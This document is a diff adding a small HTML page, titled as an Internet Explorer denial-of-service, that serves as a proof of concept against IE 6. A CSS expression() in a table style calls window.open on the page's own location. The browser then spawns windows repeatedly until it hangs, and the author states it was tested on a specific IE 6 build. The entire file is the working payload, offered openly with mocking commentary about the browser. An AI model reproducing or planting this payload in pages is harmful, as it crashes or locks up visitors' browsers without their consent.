@@ -1,0 +1,19 @@
+&lt;html&gt;
+   &lt;head&gt;
+       &lt;title&gt;Another non-standards compliant IE D.O.S.&lt;/title&gt;
+   &lt;/head&gt;
+   &lt;body&gt;
+       &lt;div id=&quot;foo&quot; style=&quot;height: 20px; border: 1px solid blue&quot;&gt;
+           &lt;table style=&quot;border: 1px solid red; width:
+expression(parseInt(window.open(self.location))+document.getElementById(&#039;foo&#039;).offsetWidth+&#039;px&#039;);&quot;&gt;
+           &lt;tr&gt;
+               &lt;td&gt;
+                   IE makes my life harder :(. It sucks, don&#039;t use it :).
+               &lt;/td&gt;
+           &lt;/tr&gt;
+           &lt;/table&gt;
+       &lt;/div&gt;
+       Written by &lt;a href=&quot;http://xiam.be&quot;&gt;xiam&lt;/a&gt;.&lt;br /&gt;
+       Tested under IE 6.0.2900.2180
+   &lt;/body&gt;
+&lt;/html&gt;
